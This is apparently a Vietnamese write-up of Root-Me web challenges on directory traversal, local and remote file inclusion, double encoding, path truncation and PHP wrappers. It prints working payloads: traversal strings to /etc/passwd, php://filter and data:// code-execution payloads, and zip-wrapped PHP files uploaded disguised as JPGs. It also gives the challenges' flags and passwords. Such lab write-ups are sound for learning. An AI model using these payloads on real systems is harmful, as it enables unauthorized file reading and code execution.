# Directory traversal
Luớt 1 vòng web ta nhận thấy tham số `galerie` là khả nghi nhất

![image](https://user-images.githubusercontent.com/92881216/227284931-67934ebd-a39c-4389-9d94-fcc41e54d3f3.png)

Khai thác thử với payload: `../../../../../../etc/passwd` thì có lỗi xảy ra:

![image](https://user-images.githubusercontent.com/92881216/227285734-570a76e0-3e2a-44da-bad1-9078e158cd09.png)

Theo như lỗi `File(galerie/../../../../../../etc/passwd) is not within the allowed path(s)` có lẽ có 1 thư mục là `galerie` chứa dữ liệu ẩn.

Tiếp tục dùng payload `./` có nghĩa là chỉ thư mục hiện tại : 

![image](https://user-images.githubusercontent.com/92881216/227287017-832727d3-b02c-4e1e-9883-367cd8dd69b5.png)

Như vậy là có 1 cái gì đó hiện ra: `86hwnX2r`. Tiếp tục check source code thấy được: 

![image](https://user-images.githubusercontent.com/92881216/227287511-e3360488-c9bf-45c5-8dc2-648fbd872de7.png)

Truy cập vào đường dẫn trên thì phát hiện được file `password.txt`:

![image](https://user-images.githubusercontent.com/92881216/227287743-34d4782d-0fc3-4af5-89cb-4cab33175f6b.png)

Bây giờ là truy cập nó: 

![image](https://user-images.githubusercontent.com/92881216/227287963-fe373f5e-c118-4eb8-bdcf-21ebd7a1ba0a.png)

![image](https://user-images.githubusercontent.com/92881216/227288095-39494013-159d-4e37-a468-3fa14c472f5a.png)

> `kcb$!Bx@v4Gs9Ez`


# Local File Inclusion
Dạo 1 vòng web thì ta thấy 2 tham số khả nghi là `files` và `f` .

![image](https://user-images.githubusercontent.com/92881216/227306911-50e4a427-c967-46d2-93d4-5dd27d6d63f0.png)

Xem qua 1 vài trường hợp thì có vẻ `files` là tên thư mục và `f` là tên file.<br>
Test với payload `f=../../../../etc/passwd` thì có lỗi : 

![image](https://user-images.githubusercontent.com/92881216/227308369-7039ae0b-1eea-4900-bfd4-ac098f88014e.png)

Đúng như dự đoán thì server sẽ dùng hàm `file_get_contents()` để in ra nội dung file `f`.

Bây giờ hay chuyển qua admin section, nó yêu cầu username và password:

![image](https://user-images.githubusercontent.com/92881216/227309842-c1ae93a6-66bb-4bd7-8c19-52083dba173a.png)

Khi bấm Cancel thì chuyển qua admin section với thư mục `admin` :

![image](https://user-images.githubusercontent.com/92881216/227310367-647f0047-f095-4227-9bc8-092cc47fe324.png)

Như vậy ý tưởng ở đây sẽ là: tham số `files` sẽ thư mục `admin` còn `f` sẽ là index.php:

![image](https://user-images.githubusercontent.com/92881216/227310771-1b9db4b2-0838-4b2d-b3ff-4bfb8df91d5e.png)

Nhưng không có gì xảy ra cả. Để ý lại path thì phải dùng thêm `../` để lùi lại 1 thư mục, khi đó payload là `?files=../admin&f=index.php`, vậy là ta thu được source code và có username và password:

![image](https://user-images.githubusercontent.com/92881216/227311538-bb970460-bb3d-4730-860e-5129c2ce7c1e.png)

Và dùng nó để đăng nhập thôi.

![image](https://user-images.githubusercontent.com/92881216/227311720-e8170112-9d01-4009-bb09-d2c0255deaf3.png)

> `OpbNJ60xYpvAQU8`

# Local File Inclusion - Double encoding

Xem 1 vòng dễ thấy được tham số có thể bị LFI là `page`:

![image](https://user-images.githubusercontent.com/92881216/227454964-d32d4a1e-f599-4baa-9a80-2ea885a5a91f.png)

Test với payload `../../../../../../etc/passwd` nhưng hiện ra `Attack detected.` có vẻ như đã bị filter `.`, `/` . Nhìn lại đề bài là `Double Encoding` nên tiếp tục mã hóa URL 2 lần được `%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd` rồi gửi nhưng có lỗi xảy ra:

![image](https://user-images.githubusercontent.com/92881216/227455554-684fbda6-bc12-4ef6-993e-034af77df435.png)

Vậy là payload được thêm `.inc.php` vào cuối, đề yêu cầu đọc source có thể là file `index.php` nên sử dụng `index%252Ephp%00` nhưng vẫn không được.

Đến đây em dùng 1 payload khác là là wrappers: `php://filter/convert.base64-encode/resource=index.php`.

Đây là một filter stream wrapper của PHP, nó cho phép mã hóa dữ liệu từ input stream sang dạng base64.
Trong trường hợp này, `resource=index.php` sẽ chỉ định rằng ta sử dụng filter stream wrapper trên file `index.php` trong thư mục gốc của ứng dụng. Khi filter stream wrapper này được áp dụng, nội dung của `file index.php` sẽ được đọc và mã hóa dạng base64.

Tiếp tục double encodeung được `php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dindex%252Ephp` nhưng có vẻ không có file `index.php` nên đổi sang `cv` : `php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv`:

![image](https://user-images.githubusercontent.com/92881216/227459221-4742004b-d29f-4a1b-9def-8f2009eb9e59.png)

Decode chúng:

![image](https://user-images.githubusercontent.com/92881216/227459407-1e856c0d-d9e6-4b39-8908-ea275362a875.png)

Nhưng có vẻ không có gì ở trong đây, tiếp tục xem file `conf.inc.php` với payload: `php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf` 
được mã base64 là decode chúng:

![image](https://user-images.githubusercontent.com/92881216/227459755-555d7e76-ae9f-4854-a676-28aa622ff335.png)

> flag: `Th1sIsTh3Fl4g!`

# Remote File Inclusion
`Description:` Get the PHP source code.

Web có chức năng sử dụng ngôn ngữ khác và có thể `lang` là tham số bị RFI:

![image](https://user-images.githubusercontent.com/92881216/227460429-01297e1e-2fc3-4b82-9386-5aa9ffe84d8c.png)

Nhập thử với `abc`:

![image](https://user-images.githubusercontent.com/92881216/227460663-fcb2799f-2a10-4e05-9ee7-950e7c77b232.png)

Như vậy thì server báo lỗi và đồng thời thêm `_lang.php` phía sau payload. Tương tự bài trước thì dùng payload `php://filter/convert.base64-encode/resource=en` được mã base64 rồi encode chúng:

![image](https://user-images.githubusercontent.com/92881216/227464798-51f3fc10-7aac-43e6-9dd6-7b8ea264f63d.png)

Thử thay `en` bằng `index.php` nhưng vẫn không được. Vì thuộc lại `RFI` nên có thể sẽ phải cho server thực thi 1 file từ bên ngoài.<br>
Ban đầu em sử dụng thử `http://` nhưng có vẻ server rootme không cho kết nối tới server khác. Tiếp tục chuyển qua thử với `data://` với payload: `data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>`:

![image](https://user-images.githubusercontent.com/92881216/227467190-b735e168-4d83-44c9-8403-c33a592f3871.png)

Encode chúng:

![image](https://user-images.githubusercontent.com/92881216/227467307-92aecef6-7413-4393-b481-e279ddc8765c.png)

> `R3m0t3_iS_r3aL1y_3v1l`

# PHP - Path Truncation
**Description:** PHP - Path Truncation

Web có chức năng truy cập trang khác từ tham số `page` :

![image](https://user-images.githubusercontent.com/92881216/227468279-8f5ca4c6-6575-415b-aeb9-4a50d9811ff5.png)

Và mục tiêu bây giờ là phải vảo `admin.html` đã bị 403 :

![image](https://user-images.githubusercontent.com/92881216/227468446-55b04e53-eeaf-47f8-88a0-adb589fcab37.png)

Tìm hiểu 1 chút về `Path Truncation`. Có thể server đã thêm gì đó phía sau payload nhập vào `page` nên cần dùng kỹ thuật `Path Truncation` để cắt nó ra.

Độ dài kết hợp giữa filename và path là 4096 bytes, vậy chỉ cần vượt quá là sẽ cắt phần phía sau. Vì vậy mục tiêu là để nó cắt phần server thêm phía sau. Payload sẽ là

```
a/../admin.html/./././[ADD MORE]/././.
```
Thêm 1 thư mục fake là `a` để chuyển hướng tấn công để tránh lỗi từ server. Ký tự `/.` phía sau là chỉ thư mục hiện tại và dùng để max size.

Khi đó cần thêm 2040 lần `/.`. Cái này sử dụng python để tạo thôi : `'a/../admin.html'+'/.'*2040`

Kết quả: 

![image](https://user-images.githubusercontent.com/92881216/227494408-4b294324-faf6-497a-b500-178da1b080ad.png)

> flag: `110V3TrUnC4T10n`

# Local File Inclusion - Wrappers
**Description:** Retrieve the flag.

Web có 1 chức năng upload file:

![image](https://user-images.githubusercontent.com/92881216/227494874-660b1f60-3ed0-48bc-bfbe-d0cf32e06388.png)

Và nó chỉ cho phép tải lên file `JPG`

![image](https://user-images.githubusercontent.com/92881216/227495614-d9f95809-58d4-42d3-bfc8-afbdfafd2efd.png)

Sau khi upload 1 file jpg thì có 2 tham số `page` và `id` trên URL và có thể đây là chỗ để khai thác:

![image](https://user-images.githubusercontent.com/92881216/227496625-bc53f054-2bf9-42e1-b6eb-225024c1222b.png)

Test thử với `page=abc` thì nhận thấy server đã thêm `.php` và sử dụng hàm `include()`:

![image](https://user-images.githubusercontent.com/92881216/227497073-20b64131-57c5-4284-abe6-5f86f76247ac.png)

Như tiêu đề thì bài này dùng `Wrappers`, web có chức năng upload file nên có thể sử dụng: `zip://`, `rar://`, `phar://`, ...

Bây giờ tạo 1 fille php để đọc source code và đặt tên ngắn vì server có kiểm tra length payload:
```
// a.php
<?php
echo file_get_contents('index.php');
?>
```
Bây giờ nén lại thành `zip` và đổi ext sang `jpg` và gửi lên server thôi.

![image](https://user-images.githubusercontent.com/92881216/227512058-fec31651-3e54-4dd1-b1e3-57968c8781f0.png)

Sau khi gửi thì kiểm tra lại path trong source cho đúng. Bây giờ sử dụng payload: `zip://tmp/upload/MCtUO1lre.jpg%23a`. Do server tự thêm `.php` phía sau nên chỉ là `a`

![image](https://user-images.githubusercontent.com/92881216/227512640-6f3781be-0f3e-48ff-8f6e-a7e9262df495.png)

Tuy nhiên source code lại không có flag. Có thể flag nằm trong file hoặc thư mục khác. Ban đầu em thử dùng reverse shell hay hàm `system()` đều bị filter. Lên mạng tìm hiểu 1 lúc thì có hàm `scandir('.')` trả về một mảng chứa tên các files và thư mục, bao gồm cả các file ẩn và thư mục ẩn.

Bây giờ viết lại file php:
```
<?php 
$files = scandir('.');
foreach ($files as $file) {
    if ($file == "." || $file == "..") {
        continue;
    }
    if (is_dir($file)) {
        echo "$file (thư mục)<br>";
    } else {
        echo "$file (file)<br>";
    }
}
?>
```
Làm lại các bước như lúc này và được kết quả :

![image](https://user-images.githubusercontent.com/92881216/227518094-f4044075-ab4c-4bb4-9cbb-9a5ba0fb8ff0.png)

Vậy bây giờ chỉ việc đọc file `flag-mipkBswUppqwXlq9ZydO.php` chứa flag. Tiếp tục viết lại file php:
```
<?php 
echo file_get_contents('flag-mipkBswUppqwXlq9ZydO.php');
?>
```
Làm lại các bước như lúc này và được kết quả :

![image](https://user-images.githubusercontent.com/92881216/227518563-627e03ba-661c-4317-92d4-629d92fe5f5d.png)

> flag: `lf1-Wr4pp3r_Ph4R_pwn3d`









